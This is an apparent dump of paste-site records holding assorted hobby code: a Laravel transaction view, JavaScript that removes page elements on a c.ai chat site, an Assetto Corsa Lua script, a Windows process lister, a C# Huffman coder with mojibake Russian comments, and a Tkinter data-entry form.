        print(""Maximum area rectangular histogram:"", max_area_histogram(array_heights))
        break
    except ValueError:
        print(""Invalid input. Please enter a valid integer."")

"
FimGdgbp,blade detail my transaction,last63,PHP,Thursday 23rd of May 2024 09:33:45 PM CDT,"@extends('layouts.parent')

@section('title', 'My Transaction')

@section('content')
    <div class=""card"">
        <div class=""card-body"">
            <h5 class=""card-title"">My Transaction</h5>

            <nav>
                <ol class=""breadcrumb"">
                    @if (Auth::user()->role == 'admin')
                        <li class=""breadcrumb-item""><a href=""{{ route('admin.dashboard') }}"">Dashboard</a></li>
                    @else
                        <li class=""breadcrumb-item""><a href=""{{ route('user.dashboard') }}"">Dashboard</a></li>
                    @endif
                    <li class=""breadcrumb-item""><a href=""#"">Transaction</a></li>
                    <li class=""breadcrumb-item active"">My Transaction</li>
                </ol>
            </nav>
        </div>
    </div>

    <div class=""card"">
        <div class=""card-body"">
            <h5 class=""card-title"">Detail Transaction</h5>

            <!-- Table with stripped rows -->
            <table class=""table table-striped"">
                <thead>
                    <tr>
                        <th scope=""col"">Name Account</th>
                        <td scope=""col"">
                            {{ auth()->user()->name }}
                        </td>
                    </tr>
                    <tr>
                        <th scope=""col"">Reciever Name</th>
                        <td scope=""col"">
                            {{ $transaction->name }}
                        </td>
                    </tr>
                    <tr>
                        <th scope=""row"">Reciever Email</th>
                        <td>{{ $transaction->email }}</td>
                    </tr>
                    <tr>
                        <th scope=""row"">Reciever Phone</th>
                        <td>{{ $transaction->phone }}</td>
                    </tr>
                    <tr>
                        <th scope=""row"">Address</th>
                        <td>{{ $transaction->address }}</td>
                    </tr>
                    <tr>
                        <th scope=""row"">Corier</th>
                        <td>{{ $transaction->courier }}</td>
                    </tr>
                    <tr>
                        <th scope=""row"">Payment</th>
                        <td>{{ $transaction->payment }}</td>
                    </tr>
                    <tr>
                        <th scope=""row"">Payment URL</th>
                        <td>
                            <a href=""{{ $transaction->payment_url }}"" target=""_blank"">
                                {{ $transaction->payment_url }}
                            </a>
                        </td>
                    <tr>
                        <th scope=""row"">Status</th>
                        <td>
                            @if ($transaction->status == 'EXPIRED')
                                <span class=""badge bg-danger text-uppercase"">Expired</span>
                            @elseif ($transaction->status == 'PENDING')
                                <span class=""badge bg-warning text-uppercase"">Pending</span>
                            @elseif ($transaction->status == 'SETTLEMENT')
                                <span class=""badge bg-info text-uppercase"">Settlement</span>
                            @else
                                <span class=""badge bg-success text-uppercase"">Success</span>
                            @endif
                        </td>
                    </tr>
                    <tr>
                        <th scope=""row"">Total Price</th>
                        <td>Rp. {{ number_format($transaction->total_price) }}</td>
                    </tr>
                </thead>
            </table>
            <!-- End Table with stripped rows -->   

        </div>
    </div>

    <div class=""card"">
        <div class=""card-body"">
            <h5 class=""card-title"">List Product</h5>

            <!-- Table with stripped rows -->
            <table class=""table table-striped"">
                <thead>
                    <tr>
                        <th scope=""col"">No</th>
                        <th scope=""col"">Name</th>
                        <th scope=""col"">Price</th>
                        <th scope=""col"">Image</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($transaction->transaction_items as $detail)
                        <tr>
                            <td>{{ $loop->iteration }}</td>
                            <td>{{ $detail->product->name }}</td>
                            <td>Rp. {{ number_format($detail->product->price) }}</td>
                            <td>
                                <img src=""{{ $detail->product->product_galleries()->exists() ? url('storage/product/gallery', $detail->product->product_galleries->first()->image) : 'https://via.placeholder.com/100' }}""
                                    width=""250"">
                            </td>
                            {{-- <td>Rp. {{ number_format($detail->subtotal) }}</td> --}}
                        </tr>
                    @endforeach
                </tbody>
            </table>
            <!-- End Table with stripped rows -->
        </div>
    </div>

@endsection
"
wMn71sQZ,new remove,ibzi,JavaScript,Thursday 23rd of May 2024 09:10:27 PM CDT,"document.querySelector("".text-center"").remove();
document.querySelector(""p.absolute"").remove();
document.querySelectorAll('div').forEach(el => /^By @\w+$/.test(el.textContent) && el.remove());

setInterval(() => {
  document.querySelectorAll('div').forEach(el => el.textContent === 'c.ai' && el.remove());
}, 1000);

document.querySelector(""div.\\32 xl\\:hidden:nth-child(1) > div:nth-child(1)"").remove();"
BY8QwJfw,remove code,ibzi,JavaScript,Thursday 23rd of May 2024 09:09:43 PM CDT,"var div = document.querySelector('div[style=""font-size: 13px;""]'); // the created by thing

if (div) {
    while (div.firstChild) {
        div.removeChild(div.firstChild);
    }
}

var div1 = document.getElementsByClassName('text-center')[0]; // the chat header disclaimer thingie

while (div1.firstChild) {
    div1.removeChild(div1.firstChild);
}

// the c.ai logo thingie
document.querySelector('button[title=""Submit Message""]').addEventListener('click', async function() {
    await new Promise(r => setTimeout(r, 3000));
    var elements = document.querySelectorAll('div[aria-label=""AI Character""]');
    elements.forEach(function(element) {
        element.parentNode.removeChild(element);
    });
});"
ERYJhd14,Lightspeed Points,Yhugi,Lua,Thursday 23rd of May 2024 09:07:13 PM CDT,"-- Author: Jonfinity

local player = ac.getCarState(1)
local collisionTimeout = 0
local onCollision = ac.OnlineEvent({
    ac.StructItem.key(""lightspeedPointsCollision""),
    Speed = ac.StructItem.int32()
})

function script.prepare(dt)
    return true
end

function script.update(dt)
    if collisionTimeout > 0 then
        collisionTimeout = collisionTimeout - dt
    elseif player.collidedWith == 0 and player.speedKmh > 0 then
        onCollision { Speed = player.speedKmh }
        collisionTimeout = 2
    end
end
"
UcVjrCrL,win_process_list,Python253,Python,Thursday 23rd of May 2024 08:58:03 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: win_process_list.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    This script retrieves a list of running processes on a Windows system using the 'tasklist' command and prints the output.

Requirements:
    - Python 3.x
    - This script is specifically designed for Windows systems.

Functions:
    - get_process_list():
      Retrieves a list of running processes on the Windows system and returns the output as a string.

Usage:
    - Simply execute the script. It will display the list of running processes in the console.

Additional Notes:
    - This script uses the 'tasklist' command, which is a built-in Windows utility for listing running processes.
""""""

import subprocess

def get_process_list():
    """"""
    Retrieves a list of running processes on the Windows system.

    Returns:
        str: A string containing the output of the 'tasklist' command.
    """"""
    tasklist_output = subprocess.check_output(['tasklist'], shell=True)
    return tasklist_output.decode('utf-8')

if __name__ == ""__main__"":
    process_list = get_process_list()
    print(process_list)

"
825YMheT,–¥–æ–ø –∑–∞–¥–∞—á–∞ –∫–æ–¥ —Ö–∞—Ñ—Ñ–º–∞–Ω–∞,myloyo,C#,Thursday 23rd of May 2024 08:52:14 PM CDT,"//–∫–æ–¥ —Ö–∞—Ñ—Ñ–∞–º–∞–Ω–∞ –∫–ª–∞—Å—Å
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Myloyorrrr
{
    internal class HuffmanTree
    {
        private class Node:IComparable<Node>
        {
            public char symb; //–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–æ–µ –ø–æ–ª–µ
            public int count; //–∫–æ–ª-–≤–æ –ø–æ—è–≤–ª–µ–Ω–∏–π –≤ —Å—Ç—Ä–æ–∫–µ
            public int height; // –≤—ã—Å–æ—Ç–∞ –≤ –¥–µ—Ä–µ–≤–µ
            public Node left; //—Å—Å—ã–ª–∫–∞ –Ω–∞ –ª–µ–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ
            public Node right; //—Å—Å—ã–ª–∫–∞ –Ω–∞ –ø—Ä–∞–≤–æ–µ –ø–æ–¥–¥–µ—Ä–µ–≤–æ

            //–∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä –≤–ª–æ–∂–µ–Ω–Ω–æ–≥–æ –∫–ª–∞—Å—Å–∞, —Å–æ–∑–¥–∞–µ—Ç —É–∑–µ–ª –¥–µ—Ä–µ–≤–∞
            public Node(char x, int y, int z)
            {
                symb = x;
                count = y;
                height = z;
                left = null;
                right = null;
                
            }
            
            public Node(char s, int c, int h, Node l, Node r)
            {
                symb = s;
                count = c;
                height = h;
                left = l;
                right = r;
            }

            public int CompareTo(Node node)
            {
                if (this.count == node.count) 
                {
                    if (this.height == node.height)
                    {
                        return this.symb.CompareTo(node.symb);
                    }
                    return this.height.CompareTo(node.height);
                }
                return this.count.CompareTo(node.count);
            }

        }
        Node tree;
        Dictionary<char, string> encodeDict = new Dictionary<char, string>();
        Dictionary<string, char> decodeDict = new Dictionary<string, char>();


        private void Coding(Node node, string code)
        {
            if (node == null)
            {
                return;
            }
            if (node.right == null && node.left == null)
            {
                encodeDict[node.symb] = code;
            }
            //if (node.right != null)
            //{
            //    Coding(node.right, code + ""1"");
            //}
            //if (node.left != null)
            //{
            //    Coding(node.left, code + ""0"");
            //}
            Coding(node.left, code + ""0"");
            Coding(node.right, code + ""1"");
        }

        public void Encode(string fileinname, string fileoutname)
        {
            string s = """";
            using (StreamReader f = new StreamReader(fileinname))
            {
                s = f.ReadToEnd();
            }

            Dictionary<char, int> symbols = new Dictionary<char, int>();

            foreach(var elem in s)
            {
                if (!symbols.ContainsKey(elem))
                {
                    symbols.Add(elem, 0);
                }
                symbols[elem]++;
            }

            SortedSet<Node> nodes = new SortedSet<Node>();

            foreach(var node in symbols)
            {
                nodes.Add(new Node(node.Key, node.Value, 1));
            }

            while (nodes.Count > 1)
            {
                Node Node1 = nodes.First();
                nodes.Remove(Node1);
                Node Node2 = nodes.First();
                nodes.Remove(Node2);
                Node New_Node = new Node(Node1.symb, Node1.count + Node2.count, Math.Max(Node1.height, Node2.height) + 1, Node1, Node2);
                nodes.Add(New_Node);
                

            }

            tree = nodes.First();
            Coding(tree, """");

            foreach(var node in encodeDict)
            {
                Console.WriteLine(node.Key + "" = "" + node.Value);
            }

            int size = 0;
            foreach(var x in s)
            {
                size += encodeDict[x].Length;
            }

            BitArray codes = new BitArray(size);
            int ind = 0;
            foreach(var x in s)
            {
                string code = encodeDict[x];
                for (int i = 0; i < code.Length; i++)
                {
                    codes[ind] = (code[i] == '1');
                    ind++;
                }
            }

            byte[] bytes = new byte[(size+7)/8];
            codes.CopyTo(bytes, 0);

            using (BinaryWriter f = new BinaryWriter(File.Open(fileoutname, FileMode.Create)))
            {
                f.Write(encodeDict.Count);
                foreach(var node in encodeDict)
                {
                    f.Write(node.Key);
                    f.Write(node.Value);
                }
                f.Write(size);
                f.Write(bytes);
            }
        }


        public void Decode(string fileinname, string fileoutname)
        {
            int count = 0;
            StringBuilder res = new StringBuilder();
            using (BinaryReader f = new BinaryReader(File.Open(fileinname, FileMode.Open)))
            {
                count = f.ReadInt32();
                for (int i = 0; i < count; i++)
                {
                    char symb = f.ReadChar();
                    string s = f.ReadString();
                    decodeDict[s] = symb;
                }

                int size = f.ReadInt32();
                BitArray bits = new BitArray(size);
                int ind = 0;
                for (int i = 0; i < (size+7)/8; i++)
                {
                    byte b = f.ReadByte();
                    for (int j = 0; j < 8; j++)
                    {
                        bits[ind] = ((b >> j) & 1) == 1;
                        ind++;
                        if (ind >= size)
                        {
                            break;
                        }
                    }
                }
                string temp = """";
                for (int i = 0; i < size; i++)
                {
                    temp += (bits[i]) ? ""1"": ""0"";
                    if (decodeDict.ContainsKey(temp))
                    {
                        res.Append(decodeDict[temp]);
                        temp = """";
                    }

                }

            }

            using(StreamWriter f = new StreamWriter(fileoutname))
            {
                f.Write(res.ToString());
            }
        }
    }
}

//–æ—Å–Ω–æ–≤–Ω–∞—è –ø—Ä–æ–≥–∞
using System;
using System.IO;

namespace Myloyorrrr
{
    internal class Program
    {
        static void Main()
        {
            //Graph G = new Graph(""C:/–ù–∞—Å—Ç—è/–∫–Ω–∏–∏—Ç/in.txt"");
            //G.Show();
            //Console.WriteLine();
            //
            ////3 –∑–∞–¥–∞—á–∞
            //Console.WriteLine(""–í–≤–µ–¥–∏—Ç–µ –ø–µ—Ä–≤—É—é –≤–µ—Ä—à–∏–Ω—É:"");
            //int a = int.Parse(Console.ReadLine());
            //Console.WriteLine(""–í–≤–µ–¥–∏—Ç–µ –≤—Ç–æ—Ä—É—é –≤–µ—Ä—à–∏–Ω—É:"");
            //int b = int.Parse(Console.ReadLine());
            //Console.WriteLine(""–í–≤–µ–¥–∏—Ç–µ –≤–µ—Ä—à–∏–Ω—É, —á–µ—Ä–µ–∑ –∫–æ—Ç–æ—Ä—É—é –Ω–µ–ª—å–∑—è –ø—Ä–æ–π—Ç–∏:"");
            //int d = int.Parse(Console.ReadLine());
            //Console.WriteLine();
            //G.Myloyo_find(a-1, b-1, d-1);


            //// 1 –∑–∞–¥–∞—á–∞: –ø–æ–¥—Å—á–∏—Ç–∞—Ç—å —Å–º–µ–∂–Ω—ã–µ –≤–µ—Ä—à–∏–Ω—ã —Å –¥–∞–Ω–Ω–æ–π –≤–µ—Ä—à–∏–Ω–æ–π 
            //Console.Write(""–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –≤–µ—Ä—à–∏–Ω—ã: "");
            //int v = int.Parse(Console.ReadLine());
            //G.Adjacent(v);

            //// 2 –∑–∞–¥–∞—á–∞: –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –≤—Å–µ –ø–∞—Ä—ã –≤–µ—Ä—à–∏–Ω, –¥–ª—è –∫–æ—Ç–æ—Ä—ã—Ö —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ø—É—Ç—å –¥–ª–∏–Ω–æ–π –Ω–µ –±–æ–ª–µ–µ L
            //Console.Write(""–í–≤–µ–¥–∏—Ç–µ —Ç—Ä–µ–±—É–µ–º—É—é –¥–ª–∏–Ω—É –ø—É—Ç–∏: "");
            //int L = int.Parse(Console.ReadLine());
            //G.Floyd_new(L);

            //BinaryTree lipa = new BinaryTree();
            //int n = 0;

            ////–ß—Ç–µ–Ω–∏–µ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ —á–∏—Å–µ–ª –∏–∑ —Ñ–∞–π–ª–∞ input.txt –∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –∏—Ö –≤ –¥–µ—Ä–µ–≤–æ
            //using (StreamReader f = new StreamReader(""C:/–ù–∞—Å—Ç—è/–∫–Ω–∏–∏—Ç/in.txt""))
            //{
            //    string line;
            //    while ((line = f.ReadLine()) != null)
            //    {
            //        string[] text = line.Split(' ');
            //        for (int i = 0; i < text.Length; i++)
            //        {
            //            int num = int.Parse(text[i]);
            //            lipa.Add(num);
            //            n++;
            //        }
            //    }

            //}

            //lipa.Preorder();

            ////3 –¥–µ—Ä–µ–≤—å—è
            //bool IsBalance = lipa.Balance();
            //if (IsBalance)
            //{
            //    Console.WriteLine(""–î–µ—Ä–µ–≤–æ —è–≤–ª—è–µ—Ç—Å—è —Å–±–∞–ª–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–º"");
            //}
            //else
            //{
            //    Console.WriteLine(""–î–µ—Ä–µ–≤–æ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Å–±–∞–ª–∞–Ω—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–º"");
            //}

            //–¥–æ–ø –∑–∞–¥–∞—á–∞
            HuffmanTree tree = new HuffmanTree();
            //tree.Encode(""C:/–ù–∞—Å—Ç—è/–∫–Ω–∏–∏—Ç/in.txt"", ""C:/–ù–∞—Å—Ç—è/–∫–Ω–∏–∏—Ç/out.dat"");
            tree.Decode(""C:/–ù–∞—Å—Ç—è/–∫–Ω–∏–∏—Ç/out.dat"", ""C:/–ù–∞—Å—Ç—è/–∫–Ω–∏–∏—Ç/out.txt"");

        }
    }
}

"
mNLWCuFK,custom_input_box_to_json,Python253,Python,Thursday 23rd of May 2024 08:47:25 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: custom_input_box_to_json.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    - This script creates a custom input box using Tkinter.
    - Users can enter data in the input box and press Enter to add each entry.
    - Once all data has been entered, users can click the Submit button to finish.
    - It provides an option to save the entered data to a JSON file named ""output_data_entry.json"" in the current working directory.

Requirements:
    - Python 3.x
    - Tkinter library

Functions:
    - show_custom_input_box():
        Displays the custom input box and returns the user inputs as a formatted list.

    - print_user_inputs(inputs):
        Prints the user inputs in json format.

    - save_user_inputs_as_json(inputs):
        Saves the user inputs to a JSON file named ""output_data_entry.json"" in the current working directory.

Usage:
    - Run the script.
    - Enter data in the input box and press Enter for each entry.
    - Click the Submit button when all data has been entered.

Example Output:

    {
        ""1"": ""First input"",
        ""2"": ""Second input"",
        ""3"": ""Third input""
    }

Additional Notes:
    - The script provides a simple way to gather multiple inputs from the user using a graphical interface.
""""""

import tkinter as tk
import json

class CustomInputBox:
    def __init__(self, root):
        """"""
        Initialize the custom input box.

        Parameters:
            root (Tk): The root window.
        """"""
        self.root = root
        self.root.title(""Data Entry Form"")
        self.root.geometry(""400x150"")
        self.root.resizable(False, False)
        self.root.eval('tk::PlaceWindow . center')

        self.label = tk.Label(root, text=""Enter Data Below & Press 'Enter' To Add Each Entry.\nClick 'Submit' When All Data Has Been Entered:"")
        self.label.pack(pady=10)

        self.text_box = tk.Entry(root, width=40)
        self.text_box.pack(pady=5)
        self.text_box.focus_set()
        self.text_box.bind(""<Return>"", lambda event: self.add_input())

        self.button_frame = tk.Frame(root)
        self.button_frame.pack(pady=20)

        self.submit_button = tk.Button(self.button_frame, text=""Submit"", width=10, command=self.submit)
        self.submit_button.grid(row=0, column=0, padx=5)

        self.exit_button = tk.Button(self.button_frame, text=""Exit"", width=10, command=self.exit_program)
        self.exit_button.grid(row=0, column=1, padx=5)

        self.inputs = []

    def add_input(self):
        """"""
        Add input from the text box to the inputs list and clear the text box.
        """"""
        input_text = self.text_box.get()
        if input_text:
            self.inputs.append(input_text)
            self.text_box.delete(0, tk.END)
            self.text_box.focus_set()

    def submit(self):
        """"""
        Add the final input if any and close the input box.
        """"""
        if self.text_box.get():
            self.inputs.append(self.text_box.get())
        self.root.destroy()

    def exit_program(self):
        """"""
        Exit the program.
        """"""
        self.root.destroy()

def show_custom_input_box():
    """"""
    Display the custom input box and return the user inputs.

    Returns:
        list: The user inputs.
    """"""
    root = tk.Tk()
    input_box = CustomInputBox(root)
    root.mainloop()
    return input_box.inputs

def print_user_inputs(inputs):
    """"""
    Print the user inputs in a formatted manner.

    Parameters:
        inputs (list): The list of user inputs.
    """"""
    if inputs:
        print(""User inputs:"")
        for i, input_data in enumerate(inputs, start=1):
            print(f""{i}: {input_data}"")
    else:
        print(""User cancelled the input.\n\nExiting Program... Goodbye!\n"")

def save_user_inputs_as_json(inputs):
    """"""
    Save the user inputs to a JSON file named ""output_data_entry.json"".

    Parameters:
        inputs (list): The list of user inputs.
    """"""
    with open(""output_data_entry.txt"", ""w"", encoding=""utf-8"") as file:
        json.dump({str(i+1): input_data for i, input_data in enumerate(inputs)}, file, indent=4)

if __name__ == ""__main__"":
    user_inputs = show_custom_input_box()
    print_user_inputs(user_inputs)
    if user_inputs:
        choice = input(""\nDo you want to save the data to a file?\n\n1: Yes\n2: No\n\nMake your selection (1 or 2): "")
        if choice == '1':
            save_user_inputs_as_json(user_inputs)
            print(""\nData saved to 'output_data_entry.json'.\n\nExiting Program... Goodbye!\n"")
        elif choice == '2':
            print(""Data not saved."")
        else:
            print(""Invalid input. Data not saved."")

"
